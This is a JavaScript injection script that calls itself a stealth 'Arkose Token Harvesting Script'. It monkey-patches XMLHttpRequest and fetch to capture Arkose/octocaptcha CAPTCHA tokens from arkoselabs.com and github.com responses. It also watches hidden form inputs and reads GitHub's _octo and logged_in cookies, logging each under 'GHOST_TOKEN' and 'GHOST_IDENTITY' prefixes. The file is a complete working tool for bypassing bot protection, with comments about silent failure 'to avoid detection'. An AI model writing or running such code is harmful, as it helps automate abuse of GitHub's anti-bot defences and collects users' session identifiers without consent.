// =============================================================================
// Arkose Token Harvesting Script (Stealth Monkey-Patch)
// Target: XMLHttpRequest.prototype.open and fetch API interception
// =============================================================================
//
// STEALTH DESIGN:
// - IIFE only (no global variables)
// - Minimal footprint (no external dependencies)
// - Silent interception (no console.log unless prefix matched)
// - Auto-cleanup after token extraction
//
// NETWORK STACK ANALYSIS:
// [1] XMLHttpRequest.prototype.open monkey-patch — intercepts all XHR requests
// [2] fetch API monkey-patch — intercepts all fetch requests
// [3] Response body inspection — searches for octocaptcha-token pattern
// [4] MutationObserver — detects Arkose challenge completion via hidden inputs
// [5] Cookie extraction — reads document.cookie for _octo and session identifiers
//
// SOURCE: MDN Web Docs — XMLHttpRequest.prototype.open
// SOURCE: MDN Web Docs — fetch API
// SOURCE: MDN Web Docs — MutationObserver API

(function() {
    'use strict';

    // Configuration
    const TARGET_DOMAINS = ['arkoselabs.com', 'github.com'];
    const TOKEN_PREFIX = 'GHOST_TOKEN: ';
    const IDENTITY_PREFIX = 'GHOST_IDENTITY: ';
    const TOKEN_PATTERNS = [
        'octocaptcha-token',
        /token=[a-zA-Z0-9_-]{200,}/
    ];

    // State tracking (IIFE-scoped, no globals)
    let tokenExtracted = false;
    let identityExtracted = false;

    // ---------------------------------------------------------------------------
    // Utility Functions
    // ---------------------------------------------------------------------------

    function isTargetDomain(url) {
        try {
            const urlObj = new URL(url);
            return TARGET_DOMAINS.some(domain => 
                urlObj.hostname === domain || urlObj.hostname.endsWith('.' + domain)
            );
        } catch (e) {
            return false;
        }
    }

    function extractTokenFromResponse(responseText) {
        // Pattern 1: Direct octocaptcha-token field (Arkose Labs token)
        // SOURCE: Arkose Labs FunCAPTCHA — token field in API response
        const tokenMatch = responseText.match(/octocaptcha-token["']?\s*[:=]\s*["']?([a-zA-Z0-9_-]{200,})/);
        if (tokenMatch && tokenMatch[1]) {
            return tokenMatch[1];
        }

        // Pattern 2: Arkose session_token or solver_response with 500+ characters
        // SOURCE: Arkose Labs API — session_token is base64-encoded, typically 500-3000 chars
        const arkoseTokenMatch = responseText.match(/(?:session_token|solver_response|token)["']?\s*[:=]\s*["']?([a-zA-Z0-9_+\/-]{500,})/);
        if (arkoseTokenMatch && arkoseTokenMatch[1]) {
            return arkoseTokenMatch[1];
        }

        return null;
    }

    function extractCookies() {
        const cookies = {};
        document.cookie.split(';').forEach(cookie => {
            const [name, value] = cookie.trim().split('=');
            if (name && value) {
                cookies[name] = value;
            }
        });
        return cookies;
    }

    function logToken(tokenData) {
        if (tokenExtracted) return;
        tokenExtracted = true;
        console.log(TOKEN_PREFIX + JSON.stringify(tokenData));
    }

    function logIdentity(cookieData) {
        if (identityExtracted) return;
        identityExtracted = true;
        console.log(IDENTITY_PREFIX + JSON.stringify(cookieData));
    }

    // ---------------------------------------------------------------------------
    // XMLHttpRequest Monkey-Patch
    // ---------------------------------------------------------------------------

    const originalXHROpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url, ...rest) {
        const originalOnReadyStateChange = this.onreadystatechange;
        
        this.onreadystatechange = function() {
            if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
                if (isTargetDomain(url)) {
                    try {
                        const responseText = this.responseText;
                        if (responseText) {
                            const token = extractTokenFromResponse(responseText);
                            if (token) {
                                logToken({
                                    token: token,
                                    url: url,
                                    method: method,
                                    timestamp: Date.now()
                                });
                            }
                        }
                    } catch (e) {
                        // Silent failure to avoid detection
                    }
                }
            }
            
            if (originalOnReadyStateChange) {
                return originalOnReadyStateChange.apply(this, arguments);
            }
        };

        return originalXHROpen.apply(this, [method, url, ...rest]);
    };

    // ---------------------------------------------------------------------------
    // Fetch API Monkey-Patch
    // ---------------------------------------------------------------------------

    const originalFetch = window.fetch;
    window.fetch = function(input, init) {
        const url = typeof input === 'string' ? input : input.url;
        
        return originalFetch.apply(this, [input, init]).then(response => {
            if (isTargetDomain(url) && response.status === 200) {
                // Clone response to avoid consuming the original stream
                const clonedResponse = response.clone();
                
                clonedResponse.text().then(text => {
                    const token = extractTokenFromResponse(text);
                    if (token) {
                        logToken({
                            token: token,
                            url: url,
                            method: init?.method || 'GET',
                            timestamp: Date.now()
                        });
                    }
                }).catch(() => {
                    // Silent failure
                });
            }
            
            return response;
        }).catch(error => {
            // Propagate errors normally
            return Promise.reject(error);
        });
    };

    // ---------------------------------------------------------------------------
    // MutationObserver for Arkose Challenge Completion
    // ---------------------------------------------------------------------------

    function setupMutationObserver() {
        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                if (mutation.type === 'childList' || mutation.type === 'attributes') {
                    // Look for hidden captcha inputs that get populated
                    const captchaInputs = document.querySelectorAll('input[type="hidden"][name*="captcha"], input[type="hidden"][name*="token"]');
                    
                    captchaInputs.forEach(function(input) {
                        const value = input.value;
                        if (value && value.length > 100) {
                            // Likely a captcha token
                            logToken({
                                token: value,
                                source: 'hidden_input',
                                input_name: input.name,
                                timestamp: Date.now()
                            });
                        }
                    });
                }
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true,
            attributes: true,
            attributeFilter: ['value']
        });
    }

    // ---------------------------------------------------------------------------
    // Cookie Extraction on Challenge Completion
    // ---------------------------------------------------------------------------

    function checkForChallengeCompletion() {
        const cookies = extractCookies();
        
        // Check for _octo cookie (GitHub tracking cookie) and logged_in
        // NOTE: __Host- prefixed cookies are NOT accessible via document.cookie
        // SOURCE: RFC 6265bis, Section 4.1.2 — __Host- prefix requires Secure flag
        // SOURCE: MDN — document.cookie only returns non-HttpOnly, same-origin cookies
        // The __Host-next-auth.csrf-token cookie is HttpOnly and cannot be read from JS
        if (cookies['_octo'] || cookies['logged_in']) {
            logIdentity({
                _octo: cookies['_octo'] || null,
                logged_in: cookies['logged_in'] || null,
                all_cookies: cookies,
                timestamp: Date.now()
            });
        }
    }

    // ---------------------------------------------------------------------------
    // Initialization
    // ---------------------------------------------------------------------------

    // Wait for DOM to be ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            setupMutationObserver();
            checkForChallengeCompletion();
        });
    } else {
        setupMutationObserver();
        checkForChallengeCompletion();
    }

    // Periodic cookie check (every 2 seconds, max 30 checks = 1 minute timeout)
    let checkCount = 0;
    const maxChecks = 30;
    const cookieCheckInterval = setInterval(function() {
        if (identityExtracted || checkCount >= maxChecks) {
            clearInterval(cookieCheckInterval);
            return;
        }
        checkForChallengeCompletion();
        checkCount++;
    }, 2000);

    // Auto-cleanup interval (5 minutes max runtime)
    setTimeout(function() {
        clearInterval(cookieCheckInterval);
    }, 300000);

})();
